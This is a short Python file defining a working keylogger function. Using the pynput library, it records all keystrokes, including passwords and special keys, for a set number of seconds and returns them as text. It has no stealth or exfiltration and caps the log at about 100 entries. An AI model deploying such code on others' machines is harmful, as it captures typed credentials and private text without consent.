from pynput import keyboard
import threading

def start_keylogger(duration=10):
    """Start a keylogger and return logged keys."""
    log = []
    
    def on_press(key):
        try:
            # Convert key to readable format
            if hasattr(key, 'char') and key.char:
                log.append(key.char)
            elif key == keyboard.Key.space:
                log.append(' ')
            elif key == keyboard.Key.enter:
                log.append('\n')
            elif key == keyboard.Key.tab:
                log.append('\t')
            elif key == keyboard.Key.backspace:
                log.append('[BACKSPACE]')
            elif key == keyboard.Key.delete:
                log.append('[DELETE]')
            elif key == keyboard.Key.esc:
                log.append('[ESC]')
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                log.append('[CTRL]')
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                log.append('[ALT]')
            elif key == keyboard.Key.shift:
                log.append('[SHIFT]')
            elif key == keyboard.Key.caps_lock:
                log.append('[CAPS]')
            elif hasattr(key, 'name'):
                log.append(f'[{key.name.upper()}]')
            else:
                log.append(f'[{str(key)}]')
        except Exception:
            log.append("[ERROR]")
        
        if len(log) > 100:  # Limit log size
            return False

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    threading.Event().wait(duration)  # Log for specified duration
    listener.stop()
    return "".join(log)